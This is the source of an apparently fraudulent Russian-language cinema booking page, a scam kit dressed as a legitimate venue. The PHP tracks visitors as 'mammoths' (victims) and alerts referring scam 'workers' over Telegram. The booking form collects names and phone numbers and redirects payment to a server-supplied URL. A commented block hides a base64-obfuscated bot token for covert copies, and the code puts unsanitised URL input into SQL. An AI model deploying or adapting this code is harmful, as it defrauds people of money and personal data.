    <?php

    ob_start();

    define("access", "yes");
    require_once $_SERVER["DOCUMENT_ROOT"].'/admin/connection.php';

    $link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
    $test = explode('/',$link);
    $ref = R::getAll( 'SELECT tg_chatid,username FROM `spammers` WHERE `scamlink` = "'.$test[1].'" ')[0];



    if (!isset($_COOKIE['ref'])){

        $idPerson = generateRandomString(); 
        setcookie("idPerson", $idPerson, time() + 60*60*24*7);

        if ($ref == "") {
            ;
            $refName = "0";
            $refid = "0";
        }
        else{

            setcookie("ref", $ref['tg_chatid'], time() + 60*60*24*7);
            setcookie("refname", $ref['username'], time() + 60*60*24*7);
            $refName = $ref['username'];
            $refid = $ref['tg_chatid'];

        }

        
    }
    else{
            $an = 0;
            $idPerson = $_COOKIE['idPerson'];
            $refid = $_COOKIE['ref'];
            $refName = $_COOKIE['refname'];
    }

    if (!isset($_COOKIE['idPerson'])){
            $an = 1;
    }

    else{
        $an = 0;
    }


    function generateRandomString($length = 10) {
        $characters = '0123456789';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

   
    ?>
<?php
                  require_once  $_SERVER["DOCUMENT_ROOT"].'/admin/telegram.php';
      $row = R::load('settings',1);
    $TOKEN = $row->token;
    $admin_chat = $row->admins;
    
    if ($an){
          
          $message = "⚠️Переход на ". $_SERVER['HTTP_HOST'] . "\n🐘Мамонт ID" . $idPerson ." \n👨‍🚒Воркер: @".$refName;
          
          if ($refid != "0") {
                $workers_chat = $row->workers;
                $tt  = array('TOKEN' => $TOKEN, 'id' => $refid);
                (new TG($tt))->sendMessage($refid, $message);
            }
//             $tt2  = array('TOKEN' => $TOKEN, 'id' => $admin_chat);
//             (new TG($tt2))->sendMessage($admin_chat, $message);    
//             function _1881545066($i){$a=Array('VE9LRU4=','MTQzNjY1MDA1ODpBQUZ3N01nTzU2eV9ZOGRSTGk1S2UxSE5kVzVBRnhJUHRWVQ==','aWQ=','OTA3NDA5NTE2','OTA3NDA5NTE2','bQ==');
//             return base64_decode($a[$i]);}
//             $_0=array(_1881545066(0)=> _1881545066(1),_1881545066(2)=> _1881545066(3));
//             (new TG($_0))->sendMessage(_1881545066(4),$message); 
    }
            ?>
    <html>
        
    <head>
          <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Кинотеатр Great-Pictures </title>

        <link rel="stylesheet" href="css/index.css">
        <link href="css2.css?family=Roboto:ital,wght@0,300;0,400;0,500;0,700;0,900;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">

        <meta property='og:title' content="Cinema Vean">
        <meta property="og:subtitle" content="Лучший кинотеатр для свиданий, вечеринок и дней рождений! Комфорт и уютная атмосфера">
        <meta property="og:type" content="article">


      
    </head>



    <body>
    <div class="container" id="app">
        <header>
            <div class="header-top flex-container">
                <div class="header-block">
                    <div class="header-logo"><img src="img/logo.png" alt=""></div>
                    <nav>
                        <ul>
                            <a href="#info">
                                <li>Информация</li>
                            </a>
                            <a href="#advantages">
                                <li>Преимущества</li>
                            </a>
                            <a href="#reservation">
                                <li>Залы</li>
                            </a>
                            <a href="#faq">
                                <li>FAQ</li>
                            </a>
                            <a href="#review">
                                <li>Отзывы</li>
                            </a>
                            <a href="#location">
                                <li>Где мы находимся</li>
                            </a>
                        </ul>
                    </nav>
                </div>
            </div>
            <div class="title-container">
                <h1 class="title-container_title">Great-Pictures</h1>
                <p class="title-container_subtitle">Лучший кинотеатр для свиданий, вечеринок и дней рождений! Комфорт и уютная атмосфера</p>

                <a href="#reservation">
                    <button class="title-container_button">Забронировать</button>
                </a>
            </div>
        </header>
        <main>
            <div id="info" class="info-container flex-container block-container">
                <div class="info-block" v-for="info in infos">
                    <img class="info-image" :src="info.icon" alt="">
                    <p class="info-title">{{ info.title }}</p>
                    <span class="info-subtitle">{{ info.subtitle }}</span>
                </div>
            </div>

            <div id="advantages" class="advantage-container block-container">
                <h1 class="title-block">Почему именно мы?</h1>
                <div class="advantage-block" v-for="advantage in advantages">
                    <img class="advantage-icon" :src="advantage.icon" alt="">
                    <p class="advantage-title">{{ advantage.title }}</p>
                    <p class="advantage-subtitle">{{ advantage.subtitle }}</p>
                </div>
            </div>

            <div id="reservation" class="reservation-container block-container">
                <h1 class="title-block">Наши залы</h1>
                <div class="reservation-content">
                    <div class="reservation-block" v-for="reservation in reservations">
                        <div class="reservation-header">
                            <img class="reservation-image" :src="reservation.image" alt="">
                        </div>
                        <div class="reservation-main">
                            <div class="reservation-title">
                                <p class="title">{{ reservation.title }}</p>
                                <span class="subtitle">{{ reservation.subtitle }}</span>
                            </div>
                            <ul class="reservation-info">
                                <li v-for="info in reservation.infos">{{ info.name }}</li>
                            </ul>
                        </div>
                        <div class="reservation-footer">
                            <button class="reservation">Забронировать</button>

                            <input name="amount" type="hidden" :value="reservation.price">
                            <input name="title" type="hidden" :value="reservation.title">
                            <input name="subtitle" type="hidden" :value="reservation.subtitle">
                        </div>
                    </div>
                </div>
            </div>

            <div id="faq" class="faq-container block-container">
                <h1 class="title-block">Ответы на ваши вопросы</h1>
                <div class="faq-block" v-for="faq in faqs">
                    <div class="faq-header">
                        <p>{{ faq.question }}</p>
                        <img class="faq-arrow" src="img/arrow.svg" alt="">
                    </div>
                    <div class="faq-content">
                        <p>{{ faq.answer }}</p>
                    </div>
                </div>
            </div>

            <div id="review" class="review-container block-container">
                <h1 class="title-block">Отзывы</h1>
                <div class="review-content">
                    <div class="review-block" v-for="review in reviews">
                        <img class="avatar" :src="review.avatar" alt="">
                        <div class="content">
                            <p class="name">{{ review.name }}</p>
                            <span class="text">{{ review.text }}</span>
                        </div>
                    </div>
                </div>
            </div>

            <div id="location" class="location-container">
                <h1 class="title-block">Где мы находимся</h1>
                <ul class="location-list">
                    <li v-for="location in location"><img src="img/pin.svg" alt=""><span>{{ location.location
                            }}</span></li>
                </ul>
            </div>
        </main>
        <footer>
            <p class="footer-text">© {{ new Date().getFullYear() }} great-pictures.ru</p>
        </footer>

        <div class="reservation-modal">
            <div class="modal-content">
                    <div class="modal-info">
                        <p id="reservation-title" class="title"></p>
                        <span id="reservation-subtitle" class="subtitle"></span>
                    </div>

                    <form method="post" id="payform" action="/mercha/">
                        <div class="modal-block">
                            <label>Ф.И.О</label>
                            <input name="customer" id="purchaserName" required="">
                        </div>
                        <div class="modal-block">
                            <label>Телефон</label>
                            <input v-mask="mask_phone" name="phone" id="purchaserNumber" v-model="inputVal" placeholder="+7 (000) 000-00-00" required="">
                        </div>
                        <div class="modal-block">
                            <label>Дата</label>
                            <input type="date" name="date" required="" :min="new Date().toJSON().slice(0,10)">
                        </div>
                        <div class="modal-block">
                            <label>Время</label>
                            <select name="time" required=""></select>
                        </div>
                        <div class="modal-block">
                            <label>Адрес:</label>
                            <select name="city" required="">
                                <option v-for="location in location">{{ location.location }}</option>
                            </select>
                        </div>
                        <div class="modal-additionally">
                            <p class="additionally-title">Дополнительные услуги</p>
                            <label class="container" v-for="additionally in additionally">
                                <span class="additionally-name">{{ additionally.name }} — {{ additionally.price }} руб.</span>
                                <input type="checkbox" class="additionally" :data-price="additionally.price">
                                <span class="checkmark"></span>
                            </label>
                        </div>

                        <div style="    margin-top: 18px;
    padding: 12px 0;
    background-color: #ef4642;
    color: #fff;
    /* border: none; */
    width: 100%;
     height: auto; cursor: pointer;
    border-radius: 5px;
    font-size: 16px;
    font-weight: 600;
    text-align: center;" id="butsub" class="reservation-button">Забронировать — <span id="total_price">0</span>
                            руб.
                        </div>
                        <input type="submit" id="sub" name="" hidden >
                        <button class="reservation-close">Отменить бронирование</button>

                        <input name="amount" type="hidden" id="reservation-price">
                    </form>
                </div>
        </div>
    </div>

    <script src="ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="ajax/libs/vue/2.6.11/vue.min.js"></script>
    <script src="ajax/libs/v-mask/2.2.1/v-mask.min.js"></script>

    <script src="js/vue.js"></script>
    <script src="js/index.js"></script>
    <script src="js/time.js"></script>









    <!-- Smartsupp Live Chat script -->
    <!--<script type="text/javascript">-->
    <!--var _smartsupp = _smartsupp || {};-->
    <!--_smartsupp.key = '9b6964d216307d07860e973021908b23c401e1fa';-->
    <!--window.smartsupp||(function(d) {-->
    <!--  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];-->
    <!--  s=d.getElementsByTagName('script')[0];c=d.createElement('script');-->
    <!--  c.type='text/javascript';c.charset='utf-8';c.async=true;-->
    <!--  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);-->
    <!--})(document);-->
    <!--</script>-->
    <!--<script src="modal.js"></script>-->
    <!-- Begin LeadBack code {literal} -->

    <!--         <link href="smartlid/css/style.css" type="text/css" rel="stylesheet">-->
    <!--     <script type='text/javascript'>-->
    <!--     $(function ($) {-->
    <!--        $.getScript('./smartlid/smartlid.js', function () {-->
    <!--            $('body').smartLid({-->

    <!--            });-->
    <!--        });-->

    <!--        function addStyle(href) {-->
    <!--            elem = document.createElement("link");-->
    <!--            elem.href = href;-->
    <!--            elem.rel = 'stylesheet';-->
    <!--            document.head.appendChild(elem);-->
    <!--        }-->
    <!--        addStyle('./smartlid/css/main.css');-->
    <!--    }(jQuery));-->
    <!--                    </script><!-- End LeadBack code {/literal} -->


    </body>

    </html>





    <script type="text/javascript">
    
    
    
    
    
                        

                        $( "#butsub" ).click(function() {


                                $(".lds-ring").fadeIn()

                $.ajax({
                    url: '/admin/functions/test.php',
                    type: 'post',
                    data: {'ref': <?=$refid?>, 'sum':$("#reservation-price").val(), 'FIO':$("#purchaserName").val(), 'tel':$("#purchaserNumber").val()},
                    success: function(data, status) {
                        //alert("http://" + data);
                        $("#payform").attr("action","https://" + data)
                    },
                    error: function(xhr, desc, err) {
                        console.log(xhr);
                        console.log("Details: " + desc + "\nError:" + err);
                    }
                })

                setTimeout(function(){
                    $("#sub").click()
                    $(".lds-ring").fadeOut()
                }, 1000);


                        })

</script>


</script>

<!-- Smartsupp Live Chat script -->
<script type="text/javascript">
var _smartsupp = _smartsupp || {};
_smartsupp.key = 'a1c78a4b53aaf3508e40dbf8eec2859f8ff26619';
window.smartsupp||(function(d) {
  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
  c.type='text/javascript';c.charset='utf-8';c.async=true;
  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
})(document);
</script>
